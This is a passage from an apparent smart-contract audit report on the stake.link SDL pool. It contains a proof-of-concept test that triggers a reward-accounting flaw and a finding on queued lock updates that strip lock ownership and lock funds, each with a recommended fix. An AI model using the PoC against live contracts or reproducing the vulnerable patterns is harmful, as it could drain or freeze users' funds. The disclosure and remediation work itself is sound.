      await onRamp.setTokenPool(wToken.address, wtokenPool.address)
      await offRamp.setTokenPool(wToken.address, wtokenPool.address)
      //1.user stakes :
      await sdlToken.transferAndCall(sdlPool.address,toEther(1000),ethers.utils.defaultAbiCoder.encode(['uint256', 'uint64'], [0, 0]))
      //2.distrubute rewared :
      await token1.transferAndCall(sdlPool.address, toEther(1000), '0x')
      //3. @audit incoming updates from secondary chain with 1000 resdl in supplychange :
      await offRamp.connect(signers[4]).executeSingleMessage(
         ethers.utils.formatBytes32String('messageId'),
        77,
        ethers.utils.defaultAbiCoder.encode(['uint256','int256'], [3,toEther(1000)]),
        controller.address,
        []
      )
      // here the error : the sum of withdrawable rewards , will be more then the availabel reward balance in rewardPool .
      let user = await sdlPool.withdrawableRewards(accounts[0]) // get the user withdrawAble rewards :
      let wr = await sdlPool.withdrawableRewards(controller.address) // get the ccipController withdrawable rewards :
      let rewardsAvailable = (await rewardsPool.totalRewards()) // get the total rewared available to distribute :
      // since not user withdrew reward nor ccipController , the total rewareds should be greater or equal the total withdrawAble rewards , but this not the case :
      expect(fromEther((wr[0].add(user[0])))).greaterThan(fromEther(rewardsAvailable))
      // now when the staker withdraw rewards the remain rewards will be not enough for ccipController :
      await sdlPool.withdrawRewards([token1.address]);
      // distributing rewards will revert, since there is not enough balance to cover the ccipController rewards :
      await expect(controller.distributeRewards())
      .to.be.revertedWith('');
   })

})
```

## Impact

Incorrect reward calculations could prevent rightful stakers from receiving their due rewards or leave unclaimable rewards in the pool (in the case of negative supply change), thereby compromising the protocol's credibility.

## Tools Used

manual review

## recommendations :

- Implement an `updateReward(ccipController)` call within the `handleIncomingUpdate` function to ensure rewards are recalculated whenever `effectiveBalance` changes. This will prevent miscalculations and maintain reward distribution accuracy.

```Diff
 function handleIncomingUpdate(uint256 _numNewRESDLTokens, int256 _totalRESDLSupplyChange)
        external
++      updateRewards(ccipController)
        onlyCCIPController
        returns (uint256)
     {
        uint256 mintStartIndex;
        if (_numNewRESDLTokens != 0) {
            mintStartIndex = lastLockId + 1;
            lastLockId += _numNewRESDLTokens;
        }

        if (_totalRESDLSupplyChange > 0) {
            effectiveBalances[ccipController] += uint256(_totalRESDLSupplyChange);
            totalEffectiveBalance += uint256(_totalRESDLSupplyChange);
        } else if (_totalRESDLSupplyChange < 0) {
            effectiveBalances[ccipController] -= uint256(-1 * _totalRESDLSupplyChange);
            totalEffectiveBalance -= uint256(-1 * _totalRESDLSupplyChange);
        }

        emit IncomingUpdate(_numNewRESDLTokens, _totalRESDLSupplyChange, mintStartIndex);

        return mintStartIndex;
    }
```

# Medium Risk Findings

## <a id='M-01'></a>M-01. A Specific Order of Queued Actions in `SecondaryPool` can Lead to Lost Ownership and Locked Funds

### Relevant GitHub Links

https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolSecondary.sol#L451

## Summary

- Due to a flaw in the update execution of the Secondary Pool, users can inadvertently lose ownership of their **lock IDs**, resulting in their staked `SDL` tokens being irretrievably locked within the pool. This occurs when queued full withdrawals followed by additional stakes on the same lock ID, are not processed in a manner that preserves ownership continuity.

## Vulnerability Details

- Actions that affect a user's effective reSDL balance in the Secondary Pool, such as staking, locking, withdrawing, or initiating a withdrawal, are queued for later execution rather than being applied immediately. Users may queue multiple updates to a single lock within a batch. When an update from the primary pool arrives, these queued updates are executed in the order they were requested. If updates for a lock are not processed in the correct sequence, it can lead to a state where the owner a lock id is lost and the funds remain locked in the secondary pool .

- consider a scenario where :
- bob owns **lockId 10** with **amount: 1000 sdl** .
- bob decides to withdraw his staked **1000 sdl** from this **lockId**, which will be queued.
- bob decides to add another **1000 sdl** tokens to the same **lockId**(10) , this resulting in another queued action after the withdraw one.

After the `CCIPController` relays the update to the primary chain and it's confirmed:

- bob invokes the [`executeQueuedOperations`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolSecondary.sol#L508) function to process her pending updates.
- The internal function `_executeQueuedLockUpdates` iterates through the updates of this **lockId**(10):

  - The first update processes which is bob's withdrawal _removes the ownership of his_ **lockId**(10) and decreases his balance balance and send him the sdl tokens .

```js
        if (baseAmountDiff < 0) {
            emit Withdraw(_owner, lockId, uint256(-1 * baseAmountDiff));
            if (updateLockState.amount == 0) {
             delete locks[lockId];
             delete lockOwners[lockId];                                 <<
             balances[_owner] -= 1;
             if (tokenApprovals[lockId] != address(0)) delete tokenApprovals[lockId];
                emit Transfer(_owner, address(0), lockId);
             } else {

                 locks[lockId].amount = updateLockState.amount;
             }
        sdlToken.safeTransfer(_owner, uint256(-1 * baseAmountDiff));
    }
```

- The second update, which adds more tokens, is processed next. Since `baseAmountDiff` is positive, it will updating the `locks[lockId]` with the new state and adjusting bob's effective and total balances. However, the ownership of **lockId 10** is not restored since it was removed in the first update.

- As a result, **lockId 10** holds valid staking data but lacks an associated owner because `lockOwners[10]` was cleared during the withdrawal update. Consequently, the staked SDL tokens become permanently locked in the contract, and bob is unable to access his funds due to the loss of ownership. The system does not provide a way to rectify this situation and recover the locked SDL tokens.

## Impact

- the permanent loss of user funds and lock ownership within the Secondary Pool.

## Tools Used

vs code
manual review

## Recommendations

- add a check to `_queueLockUpdate` that revert in case a full withdraw is the last update :

```Diff
  function _queueLockUpdate(address _owner, uint256 _lockId, uint256 _amount, uint64 _lockingDuration)
        internal
        onlyLockOwner(_lockId, _owner)
     {

       Lock memory lock = _getQueuedLockState(_lockId);
++        if(lock.amount == 0) revert("empty lock");
        LockUpdate memory lockUpdate = LockUpdate(updateBatchIndex, _updateLock(lock, _amount, _lockingDuration));
        queuedLockUpdates[_lockId].push(lockUpdate);
        queuedRESDLSupplyChange += int256(lockUpdate.lock.amount + lockUpdate.lock.boostAmount) - int256(lock.amount + lock.boostAmount);

        if (updateNeeded == 0) updateNeeded = 1;

        emit QueueUpdateLock(
            _owner, _lockId, lockUpdate.lock.amount, lockUpdate.lock.boostAmount, lockUpdate.lock.duration
        );
    }
```
